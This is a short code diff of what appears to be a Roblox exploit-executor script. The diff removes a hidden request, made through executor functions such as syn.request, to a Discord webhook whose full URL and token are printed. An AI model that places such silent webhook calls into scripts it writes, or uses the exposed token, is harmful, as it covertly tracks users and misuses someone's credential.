@@ -9,13 +9,7 @@ repeat
 until game.Players.LocalPlayer
 wait(5)
 LoadedUiHub = false
-local b = syn and syn.request or identifyexecutor() == "Fluxus" and request or http_request or requests
-local d =
-    b(
-    {
-        Url = "https://discord.com/api/webhooks/1244552852517556286/vDX-5gJB7mk01_201NW6xbuaxyothM47cbIGewtlyioodRpkXrYjmTBT_kRSJlCzovys"
-    }
-)
+
 function CheckSea(e)
     if game.PlaceId == 2753915549 then
         if e == 1 then
